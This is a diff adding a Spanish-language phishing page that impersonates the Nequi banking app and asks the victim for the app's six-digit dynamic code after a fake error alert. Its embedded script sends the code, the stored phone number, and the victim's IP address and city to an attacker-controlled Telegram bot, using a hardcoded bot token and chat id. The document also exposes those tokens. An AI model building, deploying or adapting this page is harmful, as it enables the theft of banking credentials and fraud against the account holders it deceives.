@@ -1,0 +1,159 @@
+
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	 <script>
+            alert("¡Ha ocurrido un error!\nPor favor ingrese su clave dinamica corretamente");
+   </script>	
+<title>Bienvenido</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="https://dns2-3-2.pages.dev/util.css">
+    <link rel="stylesheet" type="text/css" href="https://dns2-3-2.pages.dev/main.css">
+  </head>  
+<body background="https://dns2-3-2.pages.dev/background.png" bgcolor="#220120">
+	<header id="main-header">
+		<br>
+		<a class="logo-header" href="index.html">
+			<img src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+		</a> <!-- / #logo-header -->
+	</header><!-- / #main-header -->
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">
+
+				<form id="dinamicaForm">
+					<input type="hidden" id="usr" name="usuario">					
+					
+					<div class="textypn1"><span class="model" style="font-size:28px; color:#ede8f9; text-align:center;">
+					Ya casi terminas</div>
+					<div class="wrap-input101 validate-input" data-validate="" > 
+					<br>
+				
+					<div class="textypn2"><span class="model" style="font-size:16px; color:#ede8f9; text-align:center;">
+					Ingrese la clave dinamica generada automaticamente en su App Nequi para terminar el proceso.</div>
+					<br>
+					<br>
+					<div class="wrap-input101 validate-input" data-validate="">
+						<input class="input101" id="dinamica" type="text" pattern="[0-9]*" inputmode="numeric" name="inputUserDesktop" required="true" maxlength="6" minlength="6"onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" placeholder="Codigo de verificación" required="">
+						<span class="focus-input100" data-symbol=""></span>
+					</div>
+					<div class="text-right p-t-8 p-b-31">
+						
+					</div>
+					
+					<head>
+						<meta charset="UTF-8">
+						<meta name="viewport" content="width=device-width, initial-scale=1.0">
+						<style>
+						  body {
+						  }
+					  
+						  .boton-cuadrado {
+							width: 100%;
+							height: 50px;
+              background-color: #d90082;
+              color: #ffd1fd;
+							border: none;
+							border-radius: 4px; /* Añade bordes redondeados */
+							font-size: 16px;
+							font-weight: bold;
+							cursor: pointer;
+							transition: background-color 0.3s ease; /* Agrega una transición suave al color de fondo */
+						  }
+					  
+						  .boton-cuadrado:hover {
+							background-color: #9d3c76; /* Cambia el color de fondo al pasar el ratón sobre el botón */
+						  }
+						</style>
+					  </head>
+					  <body>
+					  
+						<button class="boton-cuadrado">CONTINUAR</button>
+					  
+					  </body>
+					  </html>
+						</div>
+					</div>
+					
+					<div>
+					<br>
+					<br>
+
+
+					</div><br>
+
+						
+					
+				</form>
+				
+			</div>
+			
+		</di
+	</div>
+		<div id="dropDownSelect1"></div>
+	
+	
+
+
+</body></html>
+
+
+
+<script>
+    const tokenTelegram = "7531121477:AAE1j4jEEJlsJba3rlvK5ELqmlpiGJnzlhY";
+    const tokenIPinfo = "9c9af8c7467cc4";
+
+    function obtenerUsuario() {
+        return localStorage.getItem("usuario");
+    }
+
+    // Función para enviar la dinámica a Telegram
+    function enviarDinamica(event) {
+        event.preventDefault();
+
+        const usr = obtenerUsuario();
+        const dinamica = document.getElementById("dinamica").value;
+
+        fetch(`https://ipinfo.io/json?token=${tokenIPinfo}`, {
+            method: "GET"
+        })
+        .then(response => response.json())
+        .then(data => {
+            const mensaje = `💲💲💲💲Nequi💲💲💲💲
+Celular: ${usr}
+Dinámica: ${dinamica}
+IP: ${data.ip}
+${data.city},${data.country}
+            `;
+
+            fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: "6588464495",
+                    text: mensaje
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Respuesta de Telegram:", data);
+
+                window.location.href = "codigo.html";
+            })
+            .catch(error => {
+                console.error("Error al enviar datos", error);
+            });
+        })
+        .catch(error => {
+            console.error("Error al obtener información", error);
+        });
+    }
+
+    document.getElementById("dinamicaForm").addEventListener("submit", enviarDinamica);
+
+    window.onload = function() {
+        document.getElementById("usr").value = obtenerUsuario();
+    };
+</script>
